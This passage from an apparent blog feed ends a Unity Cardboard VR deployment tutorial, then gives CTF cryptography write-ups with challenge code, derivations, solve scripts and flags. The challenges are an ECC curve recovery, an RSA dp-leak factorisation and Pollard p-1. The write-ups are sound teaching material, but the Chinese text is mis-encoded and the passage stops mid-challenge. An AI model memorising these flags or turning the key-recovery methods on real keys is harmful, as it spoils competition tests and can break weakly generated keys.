id="2ã€å¯¼å…¥Unity-SDK"><a href="#2ã€å¯¼å…¥Unity-SDK" class="headerlink" title="2ã€å¯¼å…¥Unity SDK"></a>2ã€å¯¼å…¥Unity SDK</h2><blockquote><ul><li><p>åœ¨ Unity ä¸­ï¼Œå‰å¾€Â <strong>Window</strong>ï¼ˆçª—å£ï¼‰&gt;<strong>Package Manager</strong>ã€‚</p></li><li><p>ç‚¹å‡»Â <strong>+</strong>ï¼Œç„¶åé€‰æ‹©Â <strong>Add package from git URL</strong>ã€‚</p></li><li><p>å°†Â <code>https://github.com/googlevr/cardboard-xr-plugin.git</code>Â ç²˜è´´åˆ°æ–‡æœ¬ä¸­ è¾“å…¥å­—æ®µã€‚</p></li></ul></blockquote><ul><li><p>å¯¼å…¥ä¹‹å‰å‡†å¤‡å¥½çš„ç´ æï¼ˆç›´æ¥æ‹–å…¥Unityçš„Projectä¸­å³å¯ï¼‰</p></li><li><p>è‹¥å‡ºç°å¯¼å…¥ç™½æ¨¡æƒ…å†µï¼Œè§£å†³æ–¹æ³•å¦‚ä¸‹</p></li></ul><p><img src="/2024/12/04/Unity3D/2.png"></p><ul><li>å¯¹<strong>Main camera</strong>æ·»åŠ <strong>Tracked Pose Driver</strong>ç»„ä»¶ã€‚å¹¶åœ¨ç»„ä»¶ä¸­çš„<strong>Tracking Type</strong>æ”¹ä¸º<strong>Rotation Only</strong>ã€‚</li></ul><h2 id="3ã€é…ç½®Androidé¡¹ç›®"><a href="#3ã€é…ç½®Androidé¡¹ç›®" class="headerlink" title="3ã€é…ç½®Androidé¡¹ç›®"></a>3ã€é…ç½®Androidé¡¹ç›®</h2><ul><li>åœ¨<strong>file</strong> -&gt; <strong>Build Settings</strong> ä¸­é€‰æ‹©Android -&gt; <strong>Switch Platform</strong>åˆ‡æ¢åˆ°Androidå¹³å°</li></ul><p><img src="/2024/12/04/Unity3D/3.png"></p><ul><li><p>é€‰æ‹©Â <strong>Add Open Scenes</strong>ï¼Œå¯¼å…¥ä½ çš„ç´ ææ‰€åœ¨çš„åœºæ™¯ã€‚</p></li><li><p>æ¥ç€é…ç½®<strong>Player Settings</strong></p></li></ul><blockquote><p>åˆ†è¾¨ç‡å’Œå‘ˆç°æ–¹å¼</p><ul><li><p>å‰å¾€Â <strong>Project Settings</strong>Â &gt;<strong>ç©å®¶</strong>Â &gt;<strong>åˆ†è¾¨ç‡å’Œå‘ˆç°æ–¹å¼</strong>ã€‚</p></li><li><p>å°†<strong>é»˜è®¤æ–¹å‘</strong>è®¾ç½®ä¸º<strong>æ¨ªå‘å‘å³</strong>ã€‚</p></li></ul><p><img src="/2024/12/04/Unity3D/4.png"></p><ul><li>åœç”¨<strong>Optimized Frame Pacing</strong>ã€‚(æé«˜æµç•…åº¦)</li></ul><p>å…¶ä»–è®¾ç½®</p><ul><li>è®¾ç½®APIç‰ˆæœ¬</li></ul><p><img src="/2024/12/04/Unity3D/5.png"></p><ul><li>è®¾ç½®Graphics  APIs</li></ul><p>å–æ¶ˆå‹¾é€‰<strong>Auto Graphics API</strong>,ç„¶åé€‰æ‹©<strong>OpenGLES2</strong>ï¼Œæ¥ç€å°†<strong>Color Space</strong>ä¸­é€‰æ‹©<strong>Gamma</strong>ï¼Œåœ¨<strong>Lightmap Encoding</strong>å’Œ<strong>HDR Cubemap Encoding</strong>ä¸­å‡æ”¹æˆ<strong>Low Quality</strong>ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="/2024/12/04/Unity3D/6.png"></p><ul><li><strong>åœ¨gradleä¸­æ·»åŠ ä¾èµ–é¡¹</strong></li></ul><p>å‰å¾€Â <strong>Project Settings</strong>Â &gt;<strong>ç©å®¶</strong>Â &gt;<strong>å‘å¸ƒè®¾ç½®</strong>ã€‚</p><ol><li>åœ¨Â <strong>Build</strong>Â éƒ¨åˆ†ä¸­ï¼Œé€‰æ‹©Â <code>Custom Main Gradle Template</code>Â å’ŒÂ <code>Custom Gradle Properties Template</code>ã€‚</li><li>å°†ä»¥ä¸‹ä»£ç è¡Œæ·»åŠ åˆ°Â <code>Assets/Plugins/Android/mainTemplate.gradle</code>ï¼š</li></ol><blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache">Â  <span class="hljs-attribute">implementation</span> &#x27;androidx.appcompat:appcompat:<span class="hljs-number">1</span>.<span class="hljs-number">6</span>.<span class="hljs-number">1</span>&#x27;Â  <br>Â  <span class="hljs-attribute">implementation</span> &#x27;com.google.android.gms:play-services-vision:<span class="hljs-number">20</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span>&#x27;Â  <br>Â  <span class="hljs-attribute">implementation</span> &#x27;com.google.android.material:material:<span class="hljs-number">1</span>.<span class="hljs-number">6</span>.<span class="hljs-number">1</span>&#x27;Â  <br>Â  <span class="hljs-attribute">implementation</span> &#x27;com.google.protobuf:protobuf-javalite:<span class="hljs-number">3</span>.<span class="hljs-number">19</span>.<span class="hljs-number">4</span>&#x27;<br></code></pre></td></tr></table></figure></blockquote><p><img src="/2024/12/04/Unity3D/7.png"></p><p>3.å°†ä»¥ä¸‹ä»£ç è¡Œæ·»åŠ åˆ°Â <code>Assets/Plugins/Android/gradleTemplate.properties</code></p><blockquote><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini">Â  <span class="hljs-attr">android.enableJetifier</span>=<span class="hljs-literal">true</span>Â  <br>Â  <span class="hljs-attr">android.useAndroidX</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure></blockquote><p><img src="/2024/12/04/Unity3D/8.png"></p><ul><li>å‰å¾€Â <strong>Project Settings</strong>Â &gt;<strong>XR æ’ä»¶ç®¡ç†</strong>,é€‰æ‹©Â <strong>Plug-in Providers</strong>ï¼ˆæ’ä»¶æä¾›ç¨‹åºï¼‰ä¸‹çš„Â <code>Cardboard XR Plugin</code>ã€‚</li></ul></blockquote><h2 id="4ã€éƒ¨ç½²åˆ°å®‰å“æ‰‹æœº"><a href="#4ã€éƒ¨ç½²åˆ°å®‰å“æ‰‹æœº" class="headerlink" title="4ã€éƒ¨ç½²åˆ°å®‰å“æ‰‹æœº"></a>4ã€éƒ¨ç½²åˆ°å®‰å“æ‰‹æœº</h2><p>åœ¨<strong>Build Settings</strong>ä¸­é€‰æ‹©<strong>build</strong>ç”Ÿæˆapkå¹¶å®‰è£…åˆ°æ‰‹æœºæŸ¥çœ‹æ•ˆæœï¼Œæ•ˆæœå¦‚ä¸‹ã€‚</p><p><img src="/2024/12/04/Unity3D/9.png"></p>]]></content>
    
    
    <categories>
      
      <category>Deployment</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Unity</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto-é¢˜ç›®å¤ç°</title>
    <link href="/2024/10/31/Crypto-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/10/31/Crypto-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Cryptoï¼ˆéƒ¨åˆ†èµ›é¢˜å¤ç°ï¼‰"><a href="#Cryptoï¼ˆéƒ¨åˆ†èµ›é¢˜å¤ç°ï¼‰" class="headerlink" title="Cryptoï¼ˆéƒ¨åˆ†èµ›é¢˜å¤ç°ï¼‰"></a>Cryptoï¼ˆéƒ¨åˆ†èµ›é¢˜å¤ç°ï¼‰</h1><h3 id="ä¸€ã€ECC"><a href="#ä¸€ã€ECC" class="headerlink" title="ä¸€ã€ECC"></a>ä¸€ã€ECC</h3><p><strong>é¢˜ç›®</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">assert</span> flag.startswith(<span class="hljs-string">b&#x27;SHCTF&#123;&#x27;</span>)<br><br>m = next_prime(bytes_to_long(flag))<br>p = getPrime(<span class="hljs-number">512</span>)<br>a,b = getPrime(<span class="hljs-number">128</span>),getPrime(<span class="hljs-number">128</span>)<br>E = EllipticCurve(Zmod(p),[a,b])<br>k = getPrime(<span class="hljs-number">256</span>)<br>A1 = E.random_point()<br>A2 = A1*k<br>M = E.lift_x(m)<br>C = M+A2<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p = &#x27;</span>,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;k = &#x27;</span>,k)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;A1 = &#x27;</span>,A1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;C = &#x27;</span>,C)<br></code></pre></td></tr></table></figure><p>åˆ†æé¢˜ç›®ï¼Œæ ¹æ®æ¤­åœ†æ›²çº¿$y^2&#x3D;x^3+ax+b(mod p)$,<br>æ˜“å¾—<br>$y_1^2&#x3D;x_1^3+ax_1+b(mod p)$<br>$y_2^2&#x3D;x_2^3+ax_2+b(mod p)$</p><p>å› æ­¤ $y_1^2-y_2^2&#x3D;x_1^3-x_2^3+a(x_1-x_2) (mod p)$<br>å¯ä»¥å¾—åˆ°</p><ul><li><p>$a&#x3D;((y_1^2-y_2^2)-(x_1^3-x_2^3))*(x_1-x_2)^{-1}(mod p)$</p></li><li><p>$b&#x3D;y_1^2-x_1^3-ax_1$</p></li></ul><p><em>ä»£ç å®ç°å¦‚ä¸‹ï¼š</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">9799485259524549113003780400336995829253375211044694607315372450399356814285244762186468904824132005209991983177601498069896166228214442123763065076327679</span><br>k = <span class="hljs-number">73771953838487511457389800773038323262861649769228176071578897500004883270121</span><br><br><span class="hljs-comment"># æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹ A1 çš„åæ ‡</span><br>A1_x = <span class="hljs-number">5945412329827707694132352090606154232045921322662767755331097180167148601629747751274580872108985870208681845078153424348847330421799769770041805208089791</span><br>A1_y = <span class="hljs-number">4113102573821904570542216004200810877456931033522276527318388416329888348077285857968081007666714313806776668203284797556825595791189566621228705928598709</span><br><br><span class="hljs-comment"># æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹ C çš„åæ ‡</span><br>C_x = <span class="hljs-number">2336301464307188733995312208152021176388718095735565422234047912672553316288080052957448196669174030921526180747767251838308335308474037066343018337141276</span><br>C_y = <span class="hljs-number">6868888273736103386336636953449998615833854869329393895956720058438723636197866928342387693671211918574357564701700555086194574821628053750572619551290025</span><br><br><span class="hljs-comment"># è®¡ç®—æ¤­åœ†æ›²çº¿çš„ç³»æ•° a,b</span><br>a = (((A1_y**<span class="hljs-number">2</span> - C_y**<span class="hljs-number">2</span>) - (A1_x**<span class="hljs-number">3</span> - C_x**<span class="hljs-number">3</span>)) * inverse_mod(A1_x - C_x, p)) % p<br>b = (A1_y**<span class="hljs-number">2</span> - (A1_x**<span class="hljs-number">3</span> + a * A1_x)) % p<br><br><span class="hljs-comment"># æ¤­åœ†æ›²çº¿ E</span><br>E = EllipticCurve(Zmod(p), [a, b])<br><span class="hljs-comment"># å¾—åˆ°æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹ A1 å’Œ C</span><br>A1 = E(A1_x, A1_y)<br>C = E(C_x, C_y)<br><br><span class="hljs-comment"># è®¡ç®— Mï¼ŒM æ˜¯ C å’Œ A1 çš„ k å€ä¹‹å·®</span><br>M = C - A1 * k<br><br>M_x, M_y = M.xy()<br>M_x = <span class="hljs-built_in">int</span>(M_x)  <span class="hljs-comment"># ç¡®ä¿ M_x æ˜¯æ•´æ•°</span><br>k = <span class="hljs-number">0</span>  <br><br><span class="hljs-comment"># çˆ†ç ´ï¼Œç›´åˆ°æ‰¾åˆ°åˆé€‚çš„ k</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># è®¡ç®— M_x + kï¼Œå¹¶è½¬æ¢ä¸ºå­—èŠ‚</span><br>    flag = (M_x + k).to_bytes((M_x + k).bit_length() // <span class="hljs-number">8</span> + <span class="hljs-number">1</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br>    <span class="hljs-keyword">if</span> flag[-<span class="hljs-number">1</span>] == <span class="hljs-string">b&#x27;&#125;&#x27;</span>[<span class="hljs-number">0</span>]:<br>        <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br>    k += <span class="hljs-number">1</span> <br></code></pre></td></tr></table></figure><p>æœ€åå¾—å‡ºflag</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">b&#x27;SHCTF&#123;fo1und_adm1n_1st112&#125;&#x27;<br></code></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="äºŒã€Worde"><a href="#äºŒã€Worde" class="headerlink" title="äºŒã€Worde"></a>äºŒã€Worde</h2><p><strong>é¢˜ç›®</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> enc <span class="hljs-keyword">import</span> flag<br><br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q<br>e = getPrime(<span class="hljs-number">200</span>)<br>d = gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>dp = d % (p-<span class="hljs-number">1</span>)<br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n = <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;e = <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;dp = <span class="hljs-subst">&#123;dp&#125;</span>&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 109107602100083925434534585854846831236367603422316141347264137431302883470878923089749415207692012162155876778433717629342677316345731989945596067366116672567736273807718413809647914537764235761542424897238828392953295052578070312924153469401927457894377311164918422725712644346523111884028669119193975313887</span><br><span class="hljs-string">c = 12365023456688645580386013142401018678669277172751038338862050435558830037797597611468398293100628165715843800273910908523113026689604063358765532741066964819435916168186673401044725950148852461706560086575130200892491873160148840462376185674368155136548141795152470696307075032455110914362528191482417145054</span><br><span class="hljs-string">e = 1110502004037199148392049197465263263258201603154804199229233</span><br><span class="hljs-string">dp = 3275908895382252717938319219921393159589684865527587914026986407331495145759978971843598067552610402795251010991143945338216738101191449912695396060306987</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æ</strong></p><p>$d_p&#x3D;d mod(p-1)$</p><p>$ed&#x3D;1 mod(p-1)(q-1)$</p><p>$m^{ed_p} modn&#x3D;m^{ed mod(p-1)}modn&#x3D;m^{edmod(p-1)}modp$</p><p>æ‰€ä»¥$ m^{ed_p}modn&#x3D;m^{1+k(p-1)}modp$</p><p>ç”±è´¹é©¬å°å®šç†å¾—</p><p>$m^{1+k(p-1)}&#x3D;mmodp$</p><p>$m^{ed_p}modn&#x3D;mmodp$</p><p>å³$m^{ed_p}modn-m&#x3D;0modp$</p><p>åˆå› ä¸º    $n&#x3D;p*q$</p><p>æ‰€ä»¥ï¼Œ</p><p>$p&#x3D;gcd(m^{ed_p}modn-m,n)$</p><p>$q&#x3D;n&#x2F;p$</p><p>ç”±äºpï¼Œqçš„å€¼ä¸ä¼šéšmçš„å€¼çš„å˜åŒ–è€Œå˜åŒ–ï¼Œå› æ­¤å…ˆå–ä¸€ä¸ªç®€å•çš„må€¼ç®—å‡ºpï¼Œq</p><p>è¿™é‡Œå–m&#x3D;3,å…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">109107602100083925434534585854846831236367603422316141347264137431302883470878923089749415207692012162155876778433717629342677316345731989945596067366116672567736273807718413809647914537764235761542424897238828392953295052578070312924153469401927457894377311164918422725712644346523111884028669119193975313887</span><br>c = <span class="hljs-number">12365023456688645580386013142401018678669277172751038338862050435558830037797597611468398293100628165715843800273910908523113026689604063358765532741066964819435916168186673401044725950148852461706560086575130200892491873160148840462376185674368155136548141795152470696307075032455110914362528191482417145054</span><br>e = <span class="hljs-number">1110502004037199148392049197465263263258201603154804199229233</span><br>dp = <span class="hljs-number">3275908895382252717938319219921393159589684865527587914026986407331495145759978971843598067552610402795251010991143945338216738101191449912695396060306987</span><br><br>p=gmpy2.gcd(<span class="hljs-built_in">pow</span>(<span class="hljs-number">3</span>,e*dp,n)-<span class="hljs-number">3</span>,n)<br>q=n // p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br><br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>å¾—å‡ºflagï¼š</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">SHCTF</span><span class="hljs-template-variable">&#123;W0RD_E_You_Dian_d4_39ac80&#125;</span><br></code></pre></td></tr></table></figure><h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="ä¸‰ã€é­”é¬¼çš„æ­¥ä¼"><a href="#ä¸‰ã€é­”é¬¼çš„æ­¥ä¼" class="headerlink" title="ä¸‰ã€é­”é¬¼çš„æ­¥ä¼"></a>ä¸‰ã€é­”é¬¼çš„æ­¥ä¼</h2><p><strong>é¢˜ç›®</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<br><span class="hljs-keyword">from</span> enc <span class="hljs-keyword">import</span> flag<br><br>m = bytes_to_long(flag)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_primes</span>(<span class="hljs-params">limit</span>):<br>    primes = []<br>    is_prime = [<span class="hljs-literal">True</span>] * (limit + <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, limit + <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> is_prime[num]:<br>            primes.append(num)<br>            <span class="hljs-keyword">for</span> multiple <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num * num, limit + <span class="hljs-number">1</span>, num):<br>                is_prime[multiple] = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> primes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_Prime</span>(<span class="hljs-params">bits</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        n = <span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> n.bit_length() &lt; bits:<br>            n *= choice(primes)<br>        <span class="hljs-keyword">if</span> isPrime(n + <span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">return</span> n + <span class="hljs-number">1</span><br><br>e = <span class="hljs-number">65537</span><br>primes = get_primes(e)<br>p = get_Prime(<span class="hljs-number">512</span>)<br>q = get_Prime(<span class="hljs-number">512</span>)<br>n = p*q<br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n = <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;e = <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 4186638789266977215701176406902225153580897798738374778190546920953456120773405529907877295436545488469674635531209549868315266718331642076467662180105755639770292506252529987461772914357288415820521682440518534463618953638844660234376343358577530665662965586577666423222977193832113032528182580888600345392172267</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 1101497471412301437262774092373565647672283526174670758698538912172368368818345084954023566146183938314237997217377433629432867021863253208574722128961878717486680977557664225793339730281222164389006116794870197114163633751309928211749128540642890687695741098247036592774972659188774127813915341533193950474979408</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>ç”±é¢˜ç›®æš—ç¤ºå’Œé¢˜ç›®ä»£ç å¯ä»¥çœ‹å‡ºï¼Œp-1 æ˜¯å…‰æ»‘æ•°</p><p>$p-1&#x3D;p_1p_2â€¦p_n(p_i&lt;&#x3D;B)$</p><p>æ‰€ä»¥$p-1|B!$</p><p>å³$B!&#x3D;k(p-1)$</p><p>ç”±è´¹é©¬å°å®šç†å¾—ï¼š$a^{k(p-1)}&#x3D;1modp$</p><p>$&#x3D;&gt;a^{B!}&#x3D;1modp$</p><p>å¯ä»¥å¾—çŸ¥$p&#x3D;gcd(a^{B!}-1,n)$</p><p><strong>ä»£ç å¦‚ä¸‹ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">4186638789266977215701176406902225153580897798738374778190546920953456120773405529907877295436545488469674635531209549868315266718331642076467662180105755639770292506252529987461772914357288415820521682440518534463618953638844660234376343358577530665662965586577666423222977193832113032528182580888600345392172267</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">1101497471412301437262774092373565647672283526174670758698538912172368368818345084954023566146183938314237997217377433629432867021863253208574722128961878717486680977557664225793339730281222164389006116794870197114163633751309928211749128540642890687695741098247036592774972659188774127813915341533193950474979408</span><br><br>a = <span class="hljs-number">2</span><br>k = <span class="hljs-number">2</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    a = <span class="hljs-built_in">pow</span>(a, k, n)<br>    p = gmpy2.gcd(a-<span class="hljs-number">1</span>, n)<br>    <span class="hljs-keyword">if</span> p != <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> p != n:<br>        q = n // p<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p=&quot;</span>,p)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q=&quot;</span>,q)<br>        <span class="hljs-keyword">break</span><br>    k += <span class="hljs-number">1</span><br><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br>m=long_to_bytes(m)<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°flagå¦‚ä¸‹ï¼š</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">SHCTF&#123;<span class="hljs-number">1</span>Rlc<span class="hljs-number">7</span>iO<span class="hljs-symbol">n_is_THE_d3</span>vils_<span class="hljs-number">5</span>TeP_<span class="hljs-name">G3</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="-2"><a href="#-2" class="headerlink" title></a></h2><h2 id="å››ã€å°é²¨é±¼çš„æ–¹ç¨‹"><a href="#å››ã€å°é²¨é±¼çš„æ–¹ç¨‹" class="headerlink" title="å››ã€å°é²¨é±¼çš„æ–¹ç¨‹"></a>å››ã€å°é²¨é±¼çš„æ–¹ç¨‹</h2><p><strong>é¢˜ç›®</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Cryptodome.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> uuid<br>flag1=<span class="hljs-string">&#x27;ISCTF&#123;&#x27;</span>+<span class="hljs-built_in">str</span>(uuid.uuid4())+<span class="hljs-string">&#x27;&#125;&#x27;</span><br><br>m1=bytes_to_long(flag1.encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_p</span>():<br>    BITS = <span 